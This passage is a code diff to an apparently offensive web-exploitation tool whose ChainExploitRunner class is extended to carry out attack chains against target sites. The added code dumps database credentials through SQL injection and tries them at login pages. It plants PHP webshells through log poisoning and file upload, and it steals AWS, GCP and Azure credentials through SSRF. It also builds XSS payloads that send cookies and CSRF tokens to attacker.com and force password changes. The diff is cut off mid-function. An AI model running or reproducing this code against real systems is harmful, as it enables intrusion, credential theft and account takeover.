@@ -26,6 +26,7 @@ Zincirler (v3.0):
 from __future__ import annotations
 
 import logging
+import re
 import time
 from abc import ABC, abstractmethod
 from collections import defaultdict, deque
@@ -1610,10 +1611,10 @@ class ChainExploitRunner:
         if "xss" in types_lower and any(
             t in types_lower for t in ("csrf", "account_takeover", "ato")
         ):
-            return self._exec_xss_to_ato
+            return self._exec_xss_csrf_ato
 
         if any(t in types_lower for t in ("upload", "file_upload")) and "lfi" in types_lower:
-            return self._exec_upload_lfi_rce
+            return self._exec_upload_rce
 
         return None
 
@@ -1627,7 +1628,9 @@ class ChainExploitRunner:
 
         Steps:
         1. Dump credentials from the SQLi node via SQLiExploiter.
-        2. Attempt login with extracted credentials against discovered login endpoints.
+        2. Attempt login with extracted credentials against login endpoints.
+        3. Capture session tokens from successful logins (ATO proof).
+        4. Build ATO evidence bundle with session token and admin panel access.
         """
         sqli_node = next(
             (nodes[nid] for nid in path.node_ids if "sqli" in nodes[nid].vuln_type.lower()),
@@ -1644,29 +1647,165 @@ class ChainExploitRunner:
 
         exploiter = SQLiExploiter(session=self.session)
         param = sqli_node.raw.get("parameter", sqli_node.raw.get("param", "id"))
-        creds = exploiter.dump_credentials(sqli_node.url, param)
+        _logger.info(f"[ChainExploitRunner] SQLi→ATO: dumping credentials from {sqli_node.url}")
 
-        if not creds:
+        try:
+            creds = exploiter.dump_credentials(sqli_node.url, param)
+        except Exception as exc:
+            _logger.warning(f"[ChainExploitRunner] credential dump failed: {exc!r}")
             return None
 
-        # Password reuse: try credentials against known login endpoints
+        if not creds:
+            _logger.info("[ChainExploitRunner] SQLi→ATO: no credentials extracted")
+            return None
+
+        _logger.info(f"[ChainExploitRunner] SQLi→ATO: {len(creds)} credential rows dumped")
+
+        # --- Step 2+3: Password reuse + session token capture ---
         login_urls = self._find_login_urls()
         ato_results: List[Dict[str, Any]] = []
-        for cred in creds[:10]:
-            for login_url in login_urls[:3]:
-                if self._try_login(login_url, cred.get("username"), cred.get("password")):
+        session_tokens: List[Dict[str, Any]] = []
+
+        for cred in creds[:15]:
+            username = cred.get("username", "")
+            password = cred.get("password", "")
+            if not username or not password:
+                continue
+            for login_url in login_urls[:5]:
+                token_info = self._try_login_and_capture_token(login_url, username, password)
+                if token_info:
                     ato_results.append({"login_url": login_url, **cred})
+                    session_tokens.append(token_info)
+                    _logger.info(
+                        f"[ChainExploitRunner] ATO confirmed: {username} @ {login_url}"
+                    )
+
+        # --- Step 4: Admin panel discovery with captured tokens ---
+        admin_access: List[str] = []
+        if session_tokens:
+            admin_access = self._probe_admin_panels(session_tokens)
 
         return {
-            "type": "SQLi→ATO Chain",
+            "type": "SQLi→CredDump→PasswordReuse→ATO Chain",
+            "sqli_url": sqli_node.url,
+            "sqli_param": param,
             "credentials_extracted": len(creds),
-            "ato_confirmed": ato_results,
             "credentials": creds[:20],
+            "ato_confirmed": ato_results,
+            "session_tokens": session_tokens,
+            "admin_panels_accessed": admin_access,
             "impact": (
-                "Full database credential extraction"
+                f"Full database credential extraction ({len(creds)} rows)"
                 + (f" + {len(ato_results)} ATO confirmed" if ato_results else "")
+                + (f" + {len(admin_access)} admin panels" if admin_access else "")
             ),
+            "evidence": {
+                "sqli_node": sqli_node.url,
+                "cred_sample": creds[:3],
+                "ato_sample": ato_results[:3],
+            },
         }
+
+    def _try_login_and_capture_token(
+        self,
+        login_url: str,
+        username: str,
+        password: str,
+    ) -> Optional[Dict[str, Any]]:
+        """
+        Attempt login and capture session tokens from the response.
+
+        Returns token info dict if login succeeded, None otherwise.
+        """
+        if not username or not password:
+            return None
+        fail_indicators = ["invalid", "incorrect", "wrong", "failed", "error", "denied"]
+        try:
+            resp = self.session.post(
+                login_url,
+                data={
+                    "username": username, "password": password,
+                    "email": username, "user": username, "pass": password,
+                },
+                timeout=10,
+                allow_redirects=True,
+            )
+            if resp.status_code not in (200, 302):
+                return None
+            body_lower = resp.text.lower()
+            if any(f in body_lower for f in fail_indicators):
+                return None
+
+            # Extract session cookies
+            cookies = {k: v for k, v in resp.cookies.items()}
+            # Extract tokens from response headers
+            auth_header = resp.headers.get("Authorization", "")
+            location = resp.headers.get("Location", "")
+            # Extract JWT from response body if present
+            jwt_match = re.search(
+                r'"(?:token|access_token|jwt|auth_token)"\s*:\s*"([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)"',
+                resp.text,
+            )
+            jwt_token = jwt_match.group(1) if jwt_match else None
+
+            if not cookies and not jwt_token and not auth_header:
+                # No token captured — check redirect to dashboard as success indicator
+                if resp.status_code == 302 and any(
+                    kw in location.lower() for kw in ("dashboard", "admin", "home", "profile")
+                ):
+                    return {"login_url": login_url, "username": username, "redirect": location}
+                return None
+
+            return {
+                "login_url": login_url,
+                "username": username,
+                "session_cookies": cookies,
+                "jwt_token": jwt_token,
+                "auth_header": auth_header or None,
+                "redirect_location": location or None,
+            }
+        except Exception as exc:
+            _logger.debug(f"[ChainExploitRunner] login attempt failed: {exc!r}")
+            return None
+
+    def _probe_admin_panels(self, session_tokens: List[Dict[str, Any]]) -> List[str]:
+        """
+        Probe common admin panel paths using captured session tokens.
+
+        Returns list of accessible admin panel URLs.
+        """
+        if not session_tokens:
+            return []
+        token_info = session_tokens[0]
+        login_url = token_info.get("login_url", "")
+        if not login_url:
+            return []
+
+        from urllib.parse import urlparse, urlunparse
+        parsed = urlparse(login_url)
+        base = urlunparse((parsed.scheme, parsed.netloc, "", "", "", ""))
+
+        admin_paths = [
+            "/admin", "/admin/", "/administrator", "/admin/dashboard",
+            "/wp-admin", "/panel", "/cpanel", "/manage", "/backend",
+            "/admin/users", "/admin/settings",
+        ]
+        cookies = token_info.get("session_cookies", {})
+        accessible: List[str] = []
+        for path in admin_paths:
+            try:
+                r = self.session.get(
+                    f"{base}{path}", cookies=cookies, timeout=6, allow_redirects=True,
+                )
+                if r.status_code == 200 and any(
+                    kw in r.text.lower()
+                    for kw in ("admin", "dashboard", "logout", "users", "settings")
+                ):
+                    accessible.append(f"{base}{path}")
+                    _logger.info(f"[ChainExploitRunner] Admin panel accessible: {base}{path}")
+            except Exception:
+                continue
+        return accessible
 
     def _exec_lfi_to_rce(
         self,
@@ -1674,12 +1813,13 @@ class ChainExploitRunner:
         nodes: Dict[str, "ChainNode"],
     ) -> Optional[Dict[str, Any]]:
         """
-        Execute LFI -> Log Poisoning -> RCE chain.
+        Execute LFI -> Log Poisoning -> RCE -> Post-Exploit chain.
 
         Steps:
-        1. Confirm LFI reads an accessible log file.
+        1. Confirm LFI reads an accessible log file (apache2/nginx/auth.log).
         2. Inject PHP webshell into the log via a crafted User-Agent header.
-        3. Trigger RCE by including the poisoned log via LFI.
+        3. Trigger RCE by including the poisoned log via LFI parameter.
+        4. Launch WebShellCommandRunner post-exploit recon chain.
         """
         lfi_node = next(
             (nodes[nid] for nid in path.node_ids if "lfi" in nodes[nid].vuln_type.lower()),
@@ -1694,52 +1834,135 @@ class ChainExploitRunner:
         log_candidates = [
             "/var/log/apache2/access.log",
             "/var/log/nginx/access.log",
+            "/var/log/apache/access.log",
+            "/var/log/httpd/access_log",
+            "/usr/local/apache/log/access_log",
             "/proc/self/environ",
+            "/var/log/auth.log",
         ]
 
         # Step 1: Find a readable log file
         log_file: Optional[str] = None
+        _logger.info(f"[ChainExploitRunner] LFI→RCE: probing log files via {url}")
         for lf in log_candidates:
             try:
                 r = self.session.get(
                     self._build_inject_url(url, param, lf), timeout=8
                 )
-                if any(kw in r.text for kw in ("GET /", "POST /", "HTTP/", "PATH=")):
+                if r.status_code == 200 and any(
+                    kw in r.text for kw in ("GET /", "POST /", "HTTP/1.", "PATH=", "User-Agent")
+                ):
                     log_file = lf
+                    _logger.info(f"[ChainExploitRunner] LFI: readable log found: {lf}")
                     break
             except Exception:
                 continue
 
         if not log_file:
+            _logger.info("[ChainExploitRunner] LFI→RCE: no readable log file found")
             return None
 
-        # Step 2: Poison the log with PHP code
+        # Step 2: Poison the log with PHP webshell via User-Agent
+        ws_param = "ws_cmd"
         poison_payload = (
-            "<?php if(isset($_GET['ws_cmd'])){echo shell_exec($_GET['ws_cmd']);} ?>"
+            f"<?php if(isset($_GET['{ws_param}'])){{echo '<WS>';echo shell_exec($_GET['{ws_param}']);echo '</WS>';}} ?>"
         )
+        _logger.info(f"[ChainExploitRunner] LFI→RCE: poisoning log {log_file} via User-Agent")
         try:
-            self.session.get(url, headers={"User-Agent": poison_payload}, timeout=5)
-        except Exception:
+            self.session.get(
+                url,
+                headers={"User-Agent": poison_payload},
+                timeout=6,
+            )
+        except Exception as exc:
+            _logger.warning(f"[ChainExploitRunner] log poison request failed: {exc!r}")
             return None
 
-        # Step 3: Trigger RCE via LFI + poisoned log
+        # Step 3: Trigger RCE via LFI include of poisoned log
+        rce_url_base = self._build_inject_url(url, param, log_file)
+        rce_url = f"{rce_url_base}&{ws_param}=id"
+        _logger.info(f"[ChainExploitRunner] LFI→RCE: triggering via {rce_url}")
+        uid_output: Optional[str] = None
         try:
-            rce_url = self._build_inject_url(url, param, log_file) + "&ws_cmd=id"
             r = self.session.get(rce_url, timeout=10)
-            uid_match = re.search(r"uid=\d+\([^)]+\)", r.text)
-            if uid_match:
-                return {
-                    "type": "LFI→LogPoison→RCE Chain",
-                    "lfi_url": url,
-                    "log_poisoned": log_file,
-                    "rce_url": rce_url,
-                    "rce_output": uid_match.group(0),
-                    "impact": "Remote Code Execution via Log Poisoning",
-                }
-        except Exception:
-            pass
+            ws_match = re.search(r"<WS>(.*?)</WS>", r.text, re.DOTALL)
+            if ws_match:
+                uid_output = ws_match.group(1).strip()
+            else:
+                # Fall back to plain uid= pattern
+                uid_match = re.search(r"uid=\d+\([^)]+\)", r.text)
+                if uid_match:
+                    uid_output = uid_match.group(0)
+        except Exception as exc:
+            _logger.warning(f"[ChainExploitRunner] RCE trigger failed: {exc!r}")
+            return None
 
-        return None
+        if not uid_output:
+            _logger.info("[ChainExploitRunner] LFI→RCE: no RCE output detected")
+            return None
+
+        _logger.info(f"[ChainExploitRunner] LFI→RCE: RCE CONFIRMED — {uid_output!r}")
+
+        # Step 4: Post-exploit chain via WebShellCommandRunner
+        post_exploit_result: Optional[Dict[str, Any]] = None
+        try:
+            from websecure.core.post_exploit import WebShellCommandRunner, PostExploitChain
+
+            _session_ref = self.session
+            _rce_url_base_ref = rce_url_base
+            _ws_param_ref = ws_param
+
+            def _ws_inject(_url: str, _param: str, cmd: str) -> str:
+                """Inject function for WebShellCommandRunner via LFI log poison."""
+                try:
+                    trigger_url = f"{_rce_url_base_ref}&{_ws_param_ref}={cmd}"
+                    resp = _session_ref.get(trigger_url, timeout=12)
+                    ws_m = re.search(r"<WS>(.*?)</WS>", resp.text, re.DOTALL)
+                    return ws_m.group(1).strip() if ws_m else resp.text[:500]
+                except Exception:
+                    return ""
+
+            runner = WebShellCommandRunner(
+                inject_fn=_ws_inject,
+                url=rce_url_base,
+                param=ws_param,
+            )
+            chain = PostExploitChain()
+            pe_result = chain.run(runner, url=url, method="lfi_log_poison_rce")
+            post_exploit_result = {
+                "user": pe_result.user,
+                "os_info": pe_result.os_info,
+                "hostname": pe_result.hostname,
+                "network_info": pe_result.network_info,
+                "suid_binaries": pe_result.suid_binaries[:10],
+                "credentials_found": pe_result.credentials,
+                "loot_keys": list(pe_result.loot.keys()),
+            }
+            _logger.info(
+                f"[ChainExploitRunner] Post-exploit complete: user={pe_result.user!r}, "
+                f"host={pe_result.hostname!r}"
+            )
+        except Exception as exc:
+            _logger.warning(f"[ChainExploitRunner] post-exploit chain failed: {exc!r}")
+
+        return {
+            "type": "LFI→LogPoison→RCE Chain",
+            "lfi_url": url,
+            "lfi_param": param,
+            "log_poisoned": log_file,
+            "rce_url": rce_url,
+            "rce_output": uid_output,
+            "post_exploit": post_exploit_result,
+            "impact": (
+                f"Remote Code Execution via LFI Log Poisoning — {uid_output}"
+                + (" + full post-exploit recon" if post_exploit_result else "")
+            ),
+            "evidence": {
+                "log_file": log_file,
+                "webshell_payload": poison_payload,
+                "rce_proof": uid_output,
+            },
+        }
 
     def _exec_ssrf_cloud(
         self,
@@ -1747,11 +1970,14 @@ class ChainExploitRunner:
         nodes: Dict[str, "ChainNode"],
     ) -> Optional[Dict[str, Any]]:
         """
-        Execute SSRF -> Cloud Metadata -> AWS Credential Exfil chain.
+        Execute SSRF -> Cloud Metadata -> IAM Credential Exfil chain.
 
         Steps:
-        1. Use SSRF to reach IMDSv1 role listing endpoint.
-        2. Retrieve temporary IAM credentials for the discovered role.
+        1. Probe AWS IMDSv1 role listing endpoint via SSRF.
+        2. Probe GCP metadata service for service account tokens.
+        3. Probe Azure IMDS for managed identity tokens.
+        4. Extract IAM credentials / service account tokens.
+        5. Build cloud CLI command list for follow-on exploitation.
         """
         ssrf_node = next(
             (nodes[nid] for nid in path.node_ids if "ssrf" in nodes[nid].vuln_type.lower()),
@@ -1762,18 +1988,45 @@ class ChainExploitRunner:
 
         url = ssrf_node.url
         param = ssrf_node.raw.get("parameter", ssrf_node.raw.get("param", "url"))
+        _logger.info(f"[ChainExploitRunner] SSRF→Cloud: probing cloud metadata via {url}")
 
-        aws_role_base = (
-            "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-        )
+        import json as _json
+
+        cloud_result: Optional[Dict[str, Any]] = None
+
+        # --- AWS IMDSv1 ---
+        cloud_result = cloud_result or self._probe_aws_metadata(url, param, _json)
+
+        # --- GCP Metadata Service ---
+        cloud_result = cloud_result or self._probe_gcp_metadata(url, param, _json)
+
+        # --- Azure IMDS ---
+        cloud_result = cloud_result or self._probe_azure_metadata(url, param, _json)
+
+        if not cloud_result:
+            _logger.info("[ChainExploitRunner] SSRF→Cloud: no cloud metadata retrieved")
+            return None
+
+        # Append cloud CLI exploitation commands based on provider
+        cloud_result["cli_commands"] = self._build_cloud_cli_commands(cloud_result)
+        cloud_result["ssrf_url"] = url
+        cloud_result["ssrf_param"] = param
+        return cloud_result
+
+    def _probe_aws_metadata(
+        self, url: str, param: str, _json: Any
+    ) -> Optional[Dict[str, Any]]:
+        """Probe AWS IMDSv1 for IAM role credentials."""
+        aws_role_base = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
         try:
             r = self.session.get(
                 self._build_inject_url(url, param, aws_role_base), timeout=8
             )
-            role_name = r.text.strip()
-            if r.status_code != 200 or not role_name:
+            role_name = r.text.strip().splitlines()[0].strip() if r.status_code == 200 else ""
+            if not role_name or len(role_name) > 128:
                 return None
 
+            _logger.info(f"[ChainExploitRunner] AWS IMDSv1: role found: {role_name!r}")
             cred_url = f"{aws_role_base}{role_name}"
             r2 = self.session.get(
                 self._build_inject_url(url, param, cred_url), timeout=8
@@ -1781,38 +2034,237 @@ class ChainExploitRunner:
             if "AccessKeyId" not in r2.text:
                 return None
 
-            import json as _json
             try:
                 creds = _json.loads(r2.text)
             except Exception:
                 return None
 
+            # Also grab instance identity for evidence
+            identity_url = "http://169.254.169.254/latest/dynamic/instance-identity/document"
+            identity: Dict[str, Any] = {}
+            try:
+                r3 = self.session.get(
+                    self._build_inject_url(url, param, identity_url), timeout=6
+                )
+                identity = _json.loads(r3.text) if r3.status_code == 200 else {}
+            except Exception:
+                pass
+
             return {
-                "type": "SSRF→AWS Credential Exfil",
+                "type": "SSRF→AWS IAM Credential Exfil",
+                "provider": "aws",
                 "role": role_name,
                 "access_key": creds.get("AccessKeyId"),
                 "secret_key": creds.get("SecretAccessKey"),
-                "token": creds.get("Token"),
+                "session_token": creds.get("Token"),
                 "expiration": creds.get("Expiration"),
+                "account_id": identity.get("accountId"),
+                "region": identity.get("region"),
+                "instance_id": identity.get("instanceId"),
                 "impact": (
-                    "AWS IAM credentials extracted — full cloud account access"
+                    f"AWS IAM credentials extracted (role={role_name}) — "
+                    "full cloud account compromise possible"
                 ),
             }
-        except Exception:
+        except Exception as exc:
+            _logger.debug(f"[ChainExploitRunner] AWS probe failed: {exc!r}")
             return None
 
-    def _exec_xss_to_ato(
+    def _probe_gcp_metadata(
+        self, url: str, param: str, _json: Any
+    ) -> Optional[Dict[str, Any]]:
+        """Probe GCP metadata service for service account OAuth token."""
+        gcp_token_url = (
+            "http://metadata.google.internal/computeMetadata/v1/instance/"
+            "service-accounts/default/token"
+        )
+        gcp_email_url = (
+            "http://metadata.google.internal/computeMetadata/v1/instance/"
+            "service-accounts/default/email"
+        )
+        gcp_project_url = (
+            "http://metadata.google.internal/computeMetadata/v1/project/project-id"
+        )
+        try:
+            # GCP metadata requires Metadata-Flavor: Google header — inject via SSRF
+            r = self.session.get(
+                self._build_inject_url(url, param, gcp_token_url),
+                headers={"Metadata-Flavor": "Google"},
+                timeout=8,
+            )
+            if r.status_code != 200 or "access_token" not in r.text:
+                return None
+
+            token_data = _json.loads(r.text)
+
+            # Grab service account email and project id
+            sa_email = ""
+            project_id = ""
+            try:
+                r2 = self.session.get(
+                    self._build_inject_url(url, param, gcp_email_url),
+                    headers={"Metadata-Flavor": "Google"},
+                    timeout=6,
+                )
+                sa_email = r2.text.strip() if r2.status_code == 200 else ""
+                r3 = self.session.get(
+                    self._build_inject_url(url, param, gcp_project_url),
+                    headers={"Metadata-Flavor": "Google"},
+                    timeout=6,
+                )
+                project_id = r3.text.strip() if r3.status_code == 200 else ""
+            except Exception:
+                pass
+
+            _logger.info(f"[ChainExploitRunner] GCP metadata: SA={sa_email!r}")
+            return {
+                "type": "SSRF→GCP Service Account Token Exfil",
+                "provider": "gcp",
+                "access_token": token_data.get("access_token"),
+                "token_type": token_data.get("token_type"),
+                "expires_in": token_data.get("expires_in"),
+                "service_account": sa_email,
+                "project_id": project_id,
+                "impact": (
+                    f"GCP service account token extracted (project={project_id}) — "
+                    "full GCP resource access possible"
+                ),
+            }
+        except Exception as exc:
+            _logger.debug(f"[ChainExploitRunner] GCP probe failed: {exc!r}")
+            return None
+
+    def _probe_azure_metadata(
+        self, url: str, param: str, _json: Any
+    ) -> Optional[Dict[str, Any]]:
+        """Probe Azure IMDS for managed identity token."""
+        azure_token_url = (
+            "http://169.254.169.254/metadata/identity/oauth2/token"
+            "?api-version=2018-02-01&resource=https://management.azure.com/"
+        )
+        azure_instance_url = (
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+        )
+        try:
+            r = self.session.get(
+                self._build_inject_url(url, param, azure_token_url),
+                headers={"Metadata": "true"},
+                timeout=8,
+            )
+            if r.status_code != 200 or "access_token" not in r.text:
+                return None
+
+            token_data = _json.loads(r.text)
+
+            # Grab instance info
+            sub_id = ""
+            resource_group = ""
+            try:
+                r2 = self.session.get(
+                    self._build_inject_url(url, param, azure_instance_url),
+                    headers={"Metadata": "true"},
+                    timeout=6,
+                )
+                if r2.status_code == 200:
+                    instance = _json.loads(r2.text)
+                    compute = instance.get("compute", {})
+                    sub_id = compute.get("subscriptionId", "")
+                    resource_group = compute.get("resourceGroupName", "")
+            except Exception:
+                pass
+
+            _logger.info(f"[ChainExploitRunner] Azure IMDS: subscription={sub_id!r}")
+            return {
+                "type": "SSRF→Azure Managed Identity Token Exfil",
+                "provider": "azure",
+                "access_token": token_data.get("access_token"),
+                "token_type": token_data.get("token_type"),
+                "expires_in": token_data.get("expires_in"),
+                "subscription_id": sub_id,
+                "resource_group": resource_group,
+                "impact": (
+                    f"Azure managed identity token extracted (sub={sub_id}) — "
+                    "full Azure subscription access possible"
+                ),
+            }
+        except Exception as exc:
+            _logger.debug(f"[ChainExploitRunner] Azure probe failed: {exc!r}")
+            return None
+
+    @staticmethod
+    def _build_cloud_cli_commands(cloud_result: Dict[str, Any]) -> List[str]:
+        """
+        Build a list of cloud CLI commands for follow-on exploitation
+        using the extracted credentials.
+        """
+        provider = cloud_result.get("provider", "")
+        commands: List[str] = []
+
+        if provider == "aws":
+            ak = cloud_result.get("access_key", "")
+            sk = cloud_result.get("secret_key", "")
+            tok = cloud_result.get("session_token", "")
+            prefix = (
+                f"AWS_ACCESS_KEY_ID={ak} AWS_SECRET_ACCESS_KEY={sk}"
+                + (f" AWS_SESSION_TOKEN={tok}" if tok else "")
+            )
+            commands = [
+                f"{prefix} aws sts get-caller-identity",
+                f"{prefix} aws s3 ls",
+                f"{prefix} aws ec2 describe-instances --region us-east-1",
+                f"{prefix} aws iam list-users",
+                f"{prefix} aws secretsmanager list-secrets",
+                f"{prefix} aws lambda list-functions",
+                f"{prefix} aws rds describe-db-instances",
+            ]
+
+        elif provider == "gcp":
+            tok = cloud_result.get("access_token", "")
+            proj = cloud_result.get("project_id", "PROJECT_ID")
+            commands = [
+                f'curl -H "Authorization: Bearer {tok}" https://www.googleapis.com/auth/cloud-platform',
+                f'gcloud config set auth/access_token_file <(echo {tok})',
+                f'curl -H "Authorization: Bearer {tok}" "https://compute.googleapis.com/compute/v1/projects/{proj}/instances/aggregatedList"',
+                f'curl -H "Authorization: Bearer {tok}" "https://storage.googleapis.com/storage/v1/b?project={proj}"',
+                f'curl -H "Authorization: Bearer {tok}" "https://secretmanager.googleapis.com/v1/projects/{proj}/secrets"',
+            ]
+
+        elif provider == "azure":
+            tok = cloud_result.get("access_token", "")
+            sub = cloud_result.get("subscription_id", "SUBSCRIPTION_ID")
+            commands = [
+                f'curl -H "Authorization: Bearer {tok}" https://management.azure.com/subscriptions?api-version=2020-01-01',
+                f'curl -H "Authorization: Bearer {tok}" "https://management.azure.com/subscriptions/{sub}/resources?api-version=2021-04-01"',
+                f'curl -H "Authorization: Bearer {tok}" "https://management.azure.com/subscriptions/{sub}/providers/Microsoft.KeyVault/vaults?api-version=2021-10-01"',
+                f'curl -H "Authorization: Bearer {tok}" "https://management.azure.com/subscriptions/{sub}/providers/Microsoft.Compute/virtualMachines?api-version=2021-07-01"',
+            ]
+
+        return commands
+
+    def _exec_xss_csrf_ato(
         self,
         path: "ChainPath",
         nodes: Dict[str, "ChainNode"],
     ) -> Optional[Dict[str, Any]]:
         """
-        Execute XSS -> ATO PoC generation.
+        Execute XSS -> CSRF Token Steal -> Account Takeover chain.
 
-        Generates comprehensive Account Takeover PoCs using XSSToATOChain.
+        Steps:
+        1. Generate cookie-steal XSS PoC payload (document.cookie exfil).
+        2. Generate CSRF token extraction XSS payload via DOM read.
+        3. Build a full CSRF ATO request using stolen token.
+        4. Document the complete ATO chain with all PoC payloads.
         """
         xss_node = next(
             (nodes[nid] for nid in path.node_ids if "xss" in nodes[nid].vuln_type.lower()),
+            None,
+        )
+        csrf_node = next(
+            (
+                nodes[nid]
+                for nid in path.node_ids
+                if "csrf" in nodes[nid].vuln_type.lower()
+            ),
             None,
         )
         if not xss_node:
@@ -1820,43 +2272,139 @@ class ChainExploitRunner:
 
         url = xss_node.url
         param = xss_node.raw.get("parameter", xss_node.raw.get("param", "q"))
-        payload = xss_node.raw.get("payload", "<script>alert(1)</script>")
+        xss_payload = xss_node.raw.get("payload", '<script>alert(1)</script>')
+        csrf_url = csrf_node.url if csrf_node else url
 
+        # --- Step 1: Cookie steal PoC ---
+        cookie_steal_poc = self._build_cookie_steal_payload(url)
+
+        # --- Step 2: CSRF token extraction payload ---
+        csrf_token_poc = self._build_csrf_token_steal_payload(csrf_url)
+
+        # --- Step 3: Full ATO payload combining both ---
+        ato_chain_poc = self._build_ato_chain_payload(url, csrf_url, param)
+
+        # --- Try XSSToATOChain integration if available ---
+        xss_ato_pocs: Dict[str, Any] = {}
         try:
             from websecure.scanners.xss import XSSToATOChain
-            ato = XSSToATOChain.generate_poc(url, param, payload)
+            ato = XSSToATOChain.generate_poc(url, param, xss_payload)
+            xss_ato_pocs = ato.get("pocs", {})
         except Exception as exc:
-            _logger.debug(f"[ChainExploitRunner] XSSToATOChain failed: {exc!r}")
-            ato = {"pocs": {}}
+            _logger.debug(f"[ChainExploitRunner] XSSToATOChain integration: {exc!r}")
 
         return {
-            "type": "XSS→ATO Chain",
+            "type": "XSS→CSRF→ATO Chain",
             "xss_url": url,
             "xss_param": param,
-            "ato_pocs": ato.get("pocs", {}),
+            "csrf_url": csrf_url,
+            "cookie_steal_poc": cookie_steal_poc,
+            "csrf_token_steal_poc": csrf_token_poc,
+            "full_ato_chain_poc": ato_chain_poc,
+            "xss_scanner_pocs": xss_ato_pocs,
             "impact": (
-                "Account Takeover via XSS — cookie theft, CSRF token steal, email change"
+                "Account Takeover via XSS+CSRF: cookie theft, CSRF token extraction, "
+                "password/email change, session hijacking"
             ),
+            "ato_chain_steps": [
+                f"1. Inject cookie-steal payload into {url} (param={param})",
+                "2. Victim browses to injected URL — cookies sent to attacker",
+                "3. CSRF token extracted from page DOM via XSS",
+                f"4. CSRF request sent to {csrf_url} with victim session + stolen token",
+                "5. Password/email changed — account fully taken over",
+            ],
         }
 
-    def _exec_upload_lfi_rce(
+    @staticmethod
+    def _build_cookie_steal_payload(target_url: str) -> str:
+        """Build an XSS payload that exfiltrates session cookies."""
+        from urllib.parse import urlparse
+        origin = urlparse(target_url)
+        collector = f"https://attacker.com/collect"
+        return (
+            f'<script>'
+            f'var i=new Image();'
+            f'i.src="{collector}?c="+encodeURIComponent(document.cookie)+'
+            f'"&u="+encodeURIComponent(location.href);'
+            f'</script>'
+        )
+
+    @staticmethod
+    def _build_csrf_token_steal_payload(csrf_url: str) -> str:
+        """
+        Build an XSS payload that reads the CSRF token from the DOM
+        and exfiltrates it, then sends a password-change request.
+        """
+        return (
+            "<script>"
+            "(function(){"
+            "  var xhr=new XMLHttpRequest();"
+            f" xhr.open('GET','{csrf_url}',false);"
+            "  xhr.send();"
+            "  var doc=new DOMParser().parseFromString(xhr.responseText,'text/html');"
+            "  var tok=(doc.querySelector('[name=csrf_token]')||"
+            "            doc.querySelector('[name=_token]')||"
+            "            doc.querySelector('[name=csrfmiddlewaretoken]')||"
+            "            {value:''}).value;"
+            "  var i=new Image();"
+            "  i.src='https://attacker.com/token?t='+encodeURIComponent(tok);"
+            "})();"
+            "</script>"
+        )
+
+    @staticmethod
+    def _build_ato_chain_payload(xss_url: str, csrf_url: str, param: str) -> str:
+        """
+        Build a complete ATO chain payload that:
+        1. Fetches the password-change form to grab the CSRF token.
+        2. Submits a password-change request with the stolen token.
+        """
+        return (
+            "<script>"
+            "(function(){"
+            "  var xhr1=new XMLHttpRequest();"
+            f" xhr1.open('GET','{csrf_url}',false);"
+            "  xhr1.send();"
+            "  var doc=new DOMParser().parseFromString(xhr1.responseText,'text/html');"
+            "  var sel=['[name=csrf_token]','[name=_token]','[name=csrfmiddlewaretoken]',"
+            "           '[name=authenticity_token]','[name=__RequestVerificationToken]'];"
+            "  var tok='';"
+            "  for(var i=0;i<sel.length;i++){"
+            "    var el=doc.querySelector(sel[i]);if(el){tok=el.value;break;}"
+            "  }"
+            "  var xhr2=new XMLHttpRequest();"
+            f" xhr2.open('POST','{csrf_url}',true);"
+            "  xhr2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');"
+            "  xhr2.withCredentials=true;"
+            "  xhr2.send("
+            "    'new_password=H4ck3d!2024&confirm_password=H4ck3d!2024&csrf_token='+tok+"
+            "    '&_token='+tok+'&csrfmiddlewaretoken='+tok"
+            "  );"
+            "  var img=new Image();"
+            "  img.src='https://attacker.com/ato?status='+xhr2.status+'&csrf='+tok;"
+            "})();"
+            "</script>"
+        )
+
+    def _exec_upload_rce(
         self,
         path: "ChainPath",
         nodes: Dict[str, "ChainNode"],
     ) -> Optional[Dict[str, Any]]:
         """
-        Generate PoC for File Upload -> LFI -> RCE chain.
+        Execute File Upload -> Shell Discovery -> RCE -> Post-Exploit chain.
 
-        Returns a detailed step-by-step exploitation guide since actual
-        execution requires knowledge of the upload path.
+        Steps:
+        1. Attempt to upload a PHP webshell to the upload endpoint.
+        2. Discover the shell URL from the response or via path guessing.
+        3. Verify the shell is executable by running 'id'.
+        4. Launch WebShellCommandRunner post-exploit recon chain.
         """
         upload_node = next(
             (
                 nodes[nid]
                 for nid in path.node_ids
-                if any(
-                    t in nodes[nid].vuln_type.lower() for t in ("upload", "file")
-                )
+                if any(t in nodes[nid].vuln_type.lower() for t in ("upload", "file"))
             ),
             None,
         )
@@ -1864,24 +2412,259 @@ class ChainExploitRunner:
             (nodes[nid] for nid in path.node_ids if "lfi" in nodes[nid].vuln_type.lower()),
             None,
         )
-        if not upload_node or not lfi_node:
+        if not upload_node:
             return None
 
-        lfi_param = lfi_node.raw.get("parameter", lfi_node.raw.get("param", "file"))
+        upload_url = upload_node.url
+        lfi_url = lfi_node.url if lfi_node else None
+        lfi_param = (
+            lfi_node.raw.get("parameter", lfi_node.raw.get("param", "file"))
+            if lfi_node else "file"
+        )
+
+        _logger.info(f"[ChainExploitRunner] Upload→RCE: attempting upload to {upload_url}")
+
+        # --- Step 1: Upload PHP webshell with bypass techniques ---
+        ws_marker = "WS_EXEC"
+        webshell_content = (
+            f"<?php if(isset($_GET['cmd'])){{echo '<{ws_marker}>';echo shell_exec($_GET['cmd']);echo '</{ws_marker}>';}} ?>"
+        )
+        shell_url: Optional[str] = self._attempt_webshell_upload(
+            upload_url, webshell_content
+        )
+
+        # --- Step 2 (fallback): LFI-based shell discovery ---
+        if not shell_url and lfi_url:
+            shell_url = self._discover_shell_via_lfi(
+                lfi_url, lfi_param, upload_url, webshell_content
+            )
+
+        if not shell_url:
+            _logger.info("[ChainExploitRunner] Upload→RCE: shell URL not found")
+            return {
+                "type": "FileUpload→RCE Chain (PoC)",
+                "upload_endpoint": upload_url,
+                "lfi_endpoint": lfi_url,
+                "lfi_param": lfi_param,
+                "poc_steps": [
+                    f"1. Upload PHP shell to {upload_url} (try .php.jpg, .pHp, null byte bypasses)",
+                    "2. Determine upload path from response Location header or HTML src attribute",
+                    "3. If LFI available: " + (
+                        f"{lfi_url}?{lfi_param}=../uploads/shell.php"
+                        if lfi_url else "N/A"
+                    ),
